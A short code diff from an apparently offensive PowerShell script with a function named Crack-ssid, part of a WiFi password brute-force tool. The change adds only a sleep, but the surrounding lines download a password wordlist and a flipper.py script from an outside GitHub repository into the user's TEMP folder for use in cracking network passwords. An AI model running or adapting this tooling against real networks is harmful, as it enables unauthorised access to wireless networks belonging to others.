@@ -42,6 +42,8 @@ function Crack-ssid {
     $passUrl = 'https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/pass.txt'
     $passFilePath = "$env:TEMP\pass.txt"
     Invoke-WebRequest -Uri $passUrl -OutFile $passFilePath -UseBasicParsing
+    Start-Sleep -Seconds 3
+
 
     # Download flipper.py from the URL and save it to the user's temp directory
     $flipperUrl = 'https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/flipper.py'
